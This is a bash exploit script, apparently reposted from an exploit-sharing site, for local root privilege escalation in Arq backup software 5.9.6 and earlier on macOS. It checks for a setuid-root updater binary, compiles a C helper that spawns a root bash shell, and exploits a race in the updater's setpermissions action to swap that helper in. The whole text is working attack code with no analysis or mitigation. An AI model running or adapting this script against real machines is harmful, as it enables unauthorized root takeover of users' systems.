#!/bin/bash
  
##################################################################
###### Arq <= 5.9.6 local root privilege escalation exploit ######
###### by m4rkw - https://m4.rkw.io/blog.html                 ####
##################################################################
  
vuln=`ls -la /Applications/Arq.app/Contents/Library/LoginItems/\
Arq\ Agent.app/Contents/Resources/arq_updater |grep 'rwsr-xr-x' \
|grep root`
  
cwd="`pwd`"
  
if [ "$vuln" == "" ] ; then
  echo "Not vulnerable - auto-updates not enabled."
  exit 1
fi
  
cat > arq_596_exp.c <<EOF
#include <unistd.h>
int main()
{
  setuid(0);
  seteuid(0);
  execl(
    "/bin/bash","bash","-c","rm -f $cwd/arq_updater;/bin/bash",
    NULL
  );
  return 0;
}
EOF
  
gcc -o arq_596_exp arq_596_exp.c
rm -f arq_596_exp.c
  
ln -s /Applications/Arq.app/Contents/Library/LoginItems/\
Arq\ Agent.app/Contents/Resources/arq_updater
  
./arq_updater setpermissions &>/dev/null&
rm -f ./arq_updater
mv arq_596_exp ./arq_updater
  
i=0
timeout=10
  
while :
do
  r=`ls -la ./arq_updater |grep root`
  if [ "$r" != "" ] ; then
    break
  fi
  sleep 0.1
  i=$((i+1))
  if [ $i -eq $timeout ] ; then
    rm -f ./arq_updater
    echo "Not vulnerable"
    exit 1
  fi
done
  
./arq_updater
 
#  0day.today [2023-02-20]  #
